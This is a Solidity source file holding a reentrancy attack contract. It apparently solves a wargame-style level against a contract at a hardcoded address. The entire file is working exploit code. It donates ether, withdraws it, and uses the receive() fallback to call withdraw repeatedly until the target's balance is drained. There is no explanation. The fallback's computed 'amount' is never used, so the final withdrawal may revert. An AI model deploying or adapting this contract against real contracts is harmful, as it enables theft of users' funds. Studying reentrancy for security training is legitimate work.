// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Attack {
    IReentrance reentrance = IReentrance(0x0cd998bf24F8eC1bDc2aDCF4AE3DF88dCc1a91a0);

    constructor() public {}

    function attack() external payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint amount = min(0.001 ether, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
